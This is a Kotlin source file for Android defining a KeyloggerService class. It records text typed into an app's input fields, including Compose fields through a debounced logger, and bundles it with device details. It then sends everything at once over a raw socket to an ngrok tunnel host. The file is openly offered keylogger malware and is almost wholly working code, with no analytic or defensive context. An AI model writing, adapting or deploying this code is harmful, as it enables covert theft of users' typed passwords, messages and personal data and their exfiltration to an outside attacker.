package com.example.axesite.util

import android.content.Context
import android.os.Build
import android.util.Log
import android.view.View
import android.widget.EditText
import androidx.core.widget.addTextChangedListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedQueue
import java.io.OutputStream

class KeyloggerService private constructor(private val context: Context) {

    private val TAG = "KeyloggerService"
    private val deviceId = UUID.randomUUID().toString() // Generate a unique device identifier

    private val logQueue = ConcurrentLinkedQueue<LogEntry>()
    private val loggedEditTexts = mutableSetOf<EditText>()
    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    // Map to store debounce jobs per field (useful when using Compose)
    private val debounceJobs = mutableMapOf<String, Job>()

    // Replace with your actual server URL in a real implementation
    private val SERVER_URL = "https://example.com/api/logs"

    data class LogEntry(
        val timestamp: Long,
        val fieldName: String,
        val text: String,
        val appScreen: String = ""
    )

    companion object {
        @Volatile
        private var instance: KeyloggerService? = null

        fun getInstance(context: Context): KeyloggerService {
            return instance ?: synchronized(this) {
                instance ?: KeyloggerService(context.applicationContext).also {
                    instance = it
                }
            }
        }
    }

    /**
     * Log input from a field and immediately transmit it.
     */
    private fun logInput(fieldName: String, input: String, screenName: String = "") {
        val entry = LogEntry(
            timestamp = System.currentTimeMillis(),
            fieldName = fieldName,
            text = input,
            appScreen = screenName
        )

        logQueue.add(entry)

        // Immediately transmit logs.
        coroutineScope.launch {
            transmitLogs()
        }

        val timestampStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(entry.timestamp))
        Log.d(TAG, "[$timestampStr] $fieldName: $input")
    }

    /**
     * Transmit logs to the remote server immediately.
     */
    private suspend fun transmitLogs(): Boolean {
        if (logQueue.isEmpty()) return true

        val logs = mutableListOf<LogEntry>()
        while (logQueue.isNotEmpty()) {
            logQueue.poll()?.let { logs.add(it) }
        }

        return try {
            val jsonPayload = createJsonPayload(logs)
            sendLogsToServer(jsonPayload)
            true
        } catch (e: Exception) {
            // On failure, requeue the logs.
            logs.forEach { logQueue.add(it) }
            Log.e(TAG, "Failed to transmit logs: ${e.message}")
            false
        }
    }

    /**
     * Create a JSON payload from log entries.
     */
    private fun createJsonPayload(logs: List<LogEntry>): String {
        val jsonObject = JSONObject()
        jsonObject.put("deviceId", deviceId)
        jsonObject.put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
        jsonObject.put("androidVersion", Build.VERSION.RELEASE)
        jsonObject.put("appPackage", context.packageName)
        jsonObject.put("timestamp", System.currentTimeMillis())

        val logsArray = logs.map { entry ->
            JSONObject().apply {
                put("timestamp", entry.timestamp)
                put("field", entry.fieldName)
                put("text", entry.text)
                put("screen", entry.appScreen)
            }
        }

        jsonObject.put("logs", logsArray)
        return jsonObject.toString()
    }

    /**
     * Send logs to the configured server.
     */
    @Throws(Exception::class)
    private fun sendLogsToServer(jsonPayload: String): String {
        var socket: Socket? = null
        var outputStream: OutputStream? = null
        try {
            // Connect to your server. Replace with your actual host and port.
            socket = Socket("0.tcp.ap.ngrok.io", 15267)
            outputStream = socket.getOutputStream()

            // Send the JSON payload.
            outputStream.write(jsonPayload.toByteArray())
            outputStream.flush()

            return "Log sent successfully"
        } catch (e: Exception) {
            e.printStackTrace()
            throw Exception("Error sending log: ${e.message}")
        } finally {
            outputStream?.close()
            socket?.close()
        }
    }

    /**
     * Log compose input with debounce directly in the keylogger code.
     *
     * Instead of sending the input instantly, this cancels any pending job for the given field
     * and waits for a period of inactivity (debounceDelayMillis) before logging and transmitting.
     */
    fun logComposeInput(fieldName: String, input: String, screenName: String, debounceDelayMillis: Long = 1000L) {
        // Cancel any existing debounce job for this field.
        debounceJobs[fieldName]?.cancel()
        debounceJobs[fieldName] = coroutineScope.launch {
            Log.d(TAG, "Debounce started for $fieldName with input: $input")
            delay(debounceDelayMillis)
            // After the delay, add the log entry and transmit.
            val entry = LogEntry(
                timestamp = System.currentTimeMillis(),
                fieldName = fieldName,
                text = input,
                appScreen = screenName
            )
            logQueue.add(entry)
            val timestampStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date(entry.timestamp))
            Log.d(TAG, "[$timestampStr] $fieldName: $input (debounced)")
            transmitLogs()
        }
    }
}